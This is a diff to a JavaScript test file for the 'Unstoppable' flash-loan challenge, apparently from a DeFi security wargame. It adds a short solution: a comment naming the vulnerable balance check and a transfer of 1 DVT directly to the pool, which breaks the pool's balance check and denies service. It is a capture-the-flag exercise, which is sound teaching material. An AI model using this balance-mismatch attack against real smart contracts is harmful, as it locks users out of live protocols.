@@ -32,14 +32,18 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+        // Show it's possible for someUser to take out a flash loan
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // The vulnerability is in line 40 of UnstoppableLender.sol. We can DOS the contract if we can cause a mismatch between saved balance and fetched balance. Below, we transfer the contract some DVT to cause this mismatch
+        const tx = await this.token.transfer(this.pool.address, ethers.utils.parseEther("1"));
+        await tx.wait();
     });
 
     after(async function () {
